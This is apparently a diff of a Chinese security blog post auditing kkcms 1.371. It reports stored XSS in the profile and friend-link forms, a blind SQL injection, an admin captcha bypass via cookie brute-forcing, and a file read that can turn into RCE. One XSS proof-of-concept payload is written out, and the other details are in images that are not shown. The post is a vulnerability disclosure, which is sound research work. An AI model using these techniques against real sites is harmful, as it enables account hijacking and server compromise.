+<p>貌似payload并不会因为addslashes_deep函数而失效</p>
+<p>个人信息修改处，无任何过滤造成存储型xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoKw6.png" alt=""></p>
+<p>payload:”<code>&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;&quot;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFoGSH.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/03/31/cFoJld.png" alt=""></p>
+<p>申请友链的存储xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoop4.png" alt=""></p>
+<p>后台处理<br><img src="https://z3.ax1x.com/2021/03/31/cFoO76.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/03/31/cFojAK.png" alt=""></p>
+<p>留言板和这个差不多一致，省略</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>虽然使用了addslashes_deep函数。导致登录处和代单/双引号的sql无法闭合，数据库也不是GBK<br>but还是有一处盲注<br><img src="https://z3.ax1x.com/2021/03/31/cFTS9e.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/03/31/cFT9cd.png" alt=""></p>
+<h3 id="cookie爆破后台绕过验证码"><a href="#cookie爆破后台绕过验证码" class="headerlink" title="cookie爆破后台绕过验证码"></a>cookie爆破后台绕过验证码</h3><p><img src="https://z3.ax1x.com/2021/03/31/cFTZ4S.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/03/31/cFTkHP.png" alt=""></p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在开启了 allow_url_fopen和allow_url_include开启后会变成RCE<br><img src="https://z3.ax1x.com/2021/03/31/cFTm9g.png" alt=""></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这套CMS靠着一些奇怪的方法来导致原本可利用的漏洞无法利用，例如后台功能大部分可以越权利用。但是另外的函数找不到，导致利用失败<br><img src="https://z3.ax1x.com/2021/03/31/cFTwuR.png" alt=""></p>
+<p>总的来说，这套CMS有点水</p>
+<p>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2280,12 +1789,12 @@ echo &quot;Hint: The Query String you input is: &quot;.$hint;
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>sqli-labs Less 27 -&gt; sqli-labs Less 30</p>
+    <p><span class="copy-title">文章标题:</span>kkcms1.371代码审计</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-28, 20:09:10</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/178a3f65.html" title="sqli-labs Less 27 -&gt; sqli-labs Less 30">http://422926799.github.io/posts/178a3f65.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-03-31, 00:49:39</p>
+    <p><span class="copy-title">最后更新:</span>2021-03-31, 01:55:08</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/de5a64f.html" title="kkcms1.371代码审计">http://422926799.github.io/posts/de5a64f.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
